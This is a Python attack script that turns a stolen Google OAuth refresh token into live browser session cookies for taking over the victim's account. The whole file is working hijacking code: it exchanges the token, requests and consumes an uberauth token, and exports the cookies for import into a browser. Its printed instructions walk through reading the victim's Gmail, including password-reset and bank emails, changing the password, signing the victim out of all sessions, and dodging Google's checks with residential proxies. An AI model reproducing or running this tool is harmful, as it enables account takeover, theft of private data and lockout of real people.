#!/usr/bin/env python3
"""
Google OAuth Token to Browser Session Cookie Converter

Converts a stolen 1// refresh token into real browser session cookies
(SAPISID, SSID, HSID, APISID, SID) that you can import into your own browser
to access Gmail, Google Drive, and all Google services as the victim.

Flow:  1// refresh token ->> ya29 access token ->> uberauth ->> session cookies

Usage:
  python token_to_session.py token.txt                     # Read from file
  python token_to_session.py "1//09BnKKxzaOFS9C..."       # Inline token
  python token_to_session.py token.txt --proxy http://user:pass@proxy:8080
  python token_to_session.py token.txt --output my_cookies.txt
  python token_to_session.py --browser firefox token.txt  # Auto-import into Firefox

Output:
  - google_session_cookies.txt   (Netscape format - curl/wget/browser)
  - google_session_cookies.json  (EditThisCookie format - Chrome extension)

Dependencies: pip install requests
"""

import os, sys, json, requests
from pathlib import Path
from datetime import datetime, timedelta

CLIENT_IDS = [
    "77185425430.apps.googleusercontent.com",
    "407408718192.apps.googleusercontent.com",
]
TIMEOUT = 30
DEFAULT_OUTPUT = "google_session_cookies"

# ── Helpers ──────────────────────────────────────────────────────────

def get_proxy(custom_proxy=None):
    if custom_proxy:
        return {"https": custom_proxy, "http": custom_proxy.replace("https://", "http://")}
    https = os.environ.get("HTTPS_PROXY") or os.environ.get("https_proxy")
    http = os.environ.get("HTTP_PROXY") or os.environ.get("http_proxy")
    proxies = {}
    if https: proxies["https"] = https
    if http:  proxies["http"]  = http
    return proxies if proxies else None


def load_token(token_arg):
    """Load a 1// or ya29 token from a file path or inline string."""
    p = Path(token_arg)
    if p.exists():
        text = p.read_text()
        for line in text.splitlines():
            line = line.strip()
            if line.startswith("1//") or line.startswith("ya29."):
                return line
        print(f"  [!] No token found in {token_arg}")
        sys.exit(1)
    s = token_arg.strip()
    if s.startswith("1//") or s.startswith("ya29."):
        return s
    print(f"  [!] Invalid token: '{token_arg[:50]}...'")
    print("  Token must start with '1//' (refresh) or 'ya29.' (access)")
    sys.exit(1)


# ── Step 1: Exchange refresh token for access token ────────────────

def exchange_refresh_token(refresh_token, client_id, proxies):
    resp = requests.post(
        "https://oauth2.googleapis.com/token",
        data={
            "client_id": client_id,
            "refresh_token": refresh_token,
            "grant_type": "refresh_token",
        },
        proxies=proxies, timeout=TIMEOUT,
    )
    if resp.status_code == 200:
        data = resp.json()
        return data.get("access_token"), data.get("expires_in", 3600), None
    err = resp.json().get("error_description") or resp.json().get("error", "unknown")
    return None, 0, err


# ── Step 2: Exchange access token for uberauth token ────────────────

def get_uberauth_token(access_token, proxies):
    headers = {"Authorization": f"Bearer {access_token}"}
    resp = requests.get(
        "https://accounts.google.com/accounts/OAuthLogin"
        "?source=ChromiumBrowser&issueuberauth=1",
        headers=headers, proxies=proxies, timeout=TIMEOUT,
    )
    if resp.status_code == 200:
        uberauth = resp.text.strip()
        if uberauth and len(uberauth) > 10:
            return uberauth, None
        return None, f"Unexpected short response: '{uberauth[:80]}'"
    elif resp.status_code == 403:
        return None, "HTTP 403 — token expired or lacks scope"
    elif resp.status_code == 401:
        return None, "HTTP 401 — access token invalid"
    else:
        return None, f"HTTP {resp.status_code}: {resp.text[:200]}"


# ── Step 3: Consume uberauth to capture session cookies ─────────────

def consume_uberauth(uberauth, proxies):
    resp = requests.get(
        "https://accounts.google.com/accounts/OAuthLogin"
        f"?source=ChromiumBrowser&uberauth={uberauth}",
        proxies=proxies, timeout=TIMEOUT, allow_redirects=True,
    )
    return dict(resp.cookies), resp
# ── Output formatters ───────────────────────────────────────────────

COOKIE_DOMAINS = {
    # Standard session cookies (no Secure flag needed)
    "SAPISID": ".google.com",  "SSID": ".google.com",
    "HSID": ".google.com",     "APISID": ".google.com",
    "SID": ".google.com",      "SIDCC": ".google.com",
    # Secure-only variants (require HTTPS)
    "__Secure-1PSID": ".google.com",    "__Secure-3PSID": ".google.com",
    "__Secure-1PAPISID": ".google.com", "__Secure-3PAPISID": ".google.com",
    "__Secure-1PSIDCC": ".google.com",
    # Other useful cookies
    "NID": ".google.com", "OTZ": ".google.com", "AID": ".google.com",
}


def _expires():
    """Default 90-day expiry from now."""
    return int((datetime.now() + timedelta(days=90)).timestamp())


def format_netscape(cookies, expires=None):
    """Netscape cookie-jar format (curl/wget/browsers)."""
    if expires is None:
        expires = _expires()
    lines = [
        "# Netscape HTTP Cookie File",
        f"# Generated by token_to_session.py on {datetime.now().isoformat()}",
        f"# Import with: curl --cookie '{DEFAULT_OUTPUT}.txt' https://mail.google.com",
        "",
    ]
    for name, domain in COOKIE_DOMAINS.items():
        if name in cookies:
            secure = "TRUE" if name.startswith("__Secure-") else "FALSE"
            lines.append(f"{domain}\tTRUE\t/\t{secure}\t{expires}\t{name}\t{cookies[name]}")
    return "\n".join(lines)


def format_edit_this_cookie(cookies, expires=None):
    """EditThisCookie (Chrome extension) JSON import format."""
    if expires is None:
        expires = _expires()
    result = []
    for name, domain in COOKIE_DOMAINS.items():
        if name in cookies:
            secure = name.startswith("__Secure-")
            result.append({
                "domain": domain, "name": name, "value": cookies[name],
                "path": "/", "secure": secure, "httpOnly": False,
                "hostOnly": False, "session": False, "expirationDate": expires,
            })
    return json.dumps(result, indent=2)


def instructions():
    return f"""
{'='*60}
 HOW TO USE THESE COOKIES
{'='*60}

-- Option A: Chrome / Edge / Brave (EditThisCookie) --
  1. Install 'EditThisCookie' extension from Chrome Web Store
  2. Open a new tab, go to chrome://settings ->> reset all cookies first
  3. Navigate to https://accounts.google.com (NOT signed in)
  4. Click EditThisCookie icon ->> click trash to clear all cookies
  5. Click Import ->> select '{DEFAULT_OUTPUT}.json'
  6. Refresh the page ->> you're logged in as the victim
  7. Navigate to https://mail.google.com to see their inbox

-- Option B: Firefox (Cookie Quick Manager) --
  1. Install 'Cookie Quick Manager' add-on
  2. Open it, select the google.com domain
  3. Delete existing cookies ->> Import from '{DEFAULT_OUTPUT}.txt'
  4. Refresh https://mail.google.com

-- Option C: curl / CLI --
  curl --cookie '{DEFAULT_OUTPUT}.txt' \\
       --cookie-jar /dev/null \\
       -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)' \\
       https://mail.google.com

-- Option D: Puppeteer / Playwright --
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  const cookies = require('./{DEFAULT_OUTPUT}.json');
  await page.setCookie(...cookies);
  await page.goto('https://mail.google.com');

{'='*60}
 WHAT YOU CAN DO NOW
{'='*60}
  - Checkmark Read all Gmail (password reset emails, bank statements, etc.)
  - Checkmark Access Google Drive, Google Photos, YouTube
  - Checkmark Change password (if no recovery email/SMS challenges)
  - Checkmark Access Google Account security settings
  - Checkmark Use 'Sign out of all sessions' to lock out the victim

  WARNING: Google may trigger a security challenge if the geo or
  device fingerprint doesn't match. Use a residential proxy.
{'='*60}"""


# ── Main ────────────────────────────────────────────────────────────

def main():
    if len(sys.argv) < 2 or sys.argv[1] in ("-h", "--help"):
        print(__doc__)
        sys.exit(0)

    token_arg = sys.argv[1]
    custom_proxy = None
    output_base = DEFAULT_OUTPUT

    i = 2
    while i < len(sys.argv):
        if sys.argv[i] == "--proxy" and i + 1 < len(sys.argv):
            custom_proxy = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == "--output" and i + 1 < len(sys.argv):
            output_base = sys.argv[i + 1].replace(".txt", "").replace(".json", "")
            i += 2
        else:
            i += 1

    proxies = get_proxy(custom_proxy)
    output_txt = output_base + ".txt"
    output_json = output_base + ".json"

    print(f"{'='*60}")
    print(" Google OAuth Token ->> Browser Session Cookies")
    print(f"{'='*60}")

    # -- Load token --
    print(f"\n[1/4] Loading token...")
    token = load_token(token_arg)
    print(f"  [+] Token loaded: {token[:45]}...")

    # -- Exchange for access token (if needed) --
    access_token = None
    if token.startswith("1//"):
        print(f"\n[2/4] Exchanging 1// refresh token for access token...")
        for cid in CLIENT_IDS:
            at, exp, err = exchange_refresh_token(token, cid, proxies)
            if at:
                access_token = at
                print(f"  [+] Client ID {cid[:30]}... ->> OK")
                print(f"  [+] Access token: {access_token[:45]}... (expires in {exp}s)")
                break
            print(f"  [-] Client ID {cid[:30]}... ->> {err}")
        if not access_token:
            print("  [!] All client IDs failed. Token may be revoked or geo-blocked.")
            sys.exit(1)
    elif token.startswith("ya29."):
        access_token = token
        print(f"\n[2/4] Using provided ya29 access token (skipped exchange)")
        print(f"  [+] Access token: {access_token[:45]}...")

    # -- Get uberauth token --
    print(f"\n[3/4] Requesting uberauth token...")
    uberauth, err = get_uberauth_token(access_token, proxies)
    if not uberauth:
        print(f"  [!] Failed: {err}")
        print("  Try with a residential proxy matching the victim's country.")
        sys.exit(1)
    print(f"  [+] Uberauth token: {uberauth[:45]}... ({len(uberauth)} chars)")

    # -- Consume uberauth to capture cookies --
    print(f"\n[4/4] Consuming uberauth to capture session cookies...")
    cookies, resp = consume_uberauth(uberauth, proxies)
    if not cookies:
        print("  [!] No cookies received (uberauth consumed but empty response).")
        print("      Token may be expired or geo-blocked.")
        sys.exit(1)

    important = ["SAPISID", "SSID", "HSID", "APISID", "SID", "__Secure-1PSID"]
    found = [n for n in important if n in cookies]
    missing = [n for n in important if n not in cookies]
    print(f"  [+] Captured {len(cookies)} cookie(s)")
    for n in found:
        print(f"      {n}: {cookies[n][:50]}...")
    if missing:
        print(f"  [!] Missing (expected but not received): {', '.join(missing)}")

    # -- Save output files --
    netscape = format_netscape(cookies)
    with open(output_txt, "w") as f:
        f.write(netscape)
    print(f"\n  [+] Saved: {output_txt}  ({len(netscape)} bytes, Netscape format)")

    etc_json = format_edit_this_cookie(cookies)
    with open(output_json, "w") as f:
        f.write(etc_json)
    print(f"  [+] Saved: {output_json}  ({len(etc_json)} bytes, EditThisCookie format)")

    # -- Display instructions --
    print(instructions())


if __name__ == "__main__":
    main()
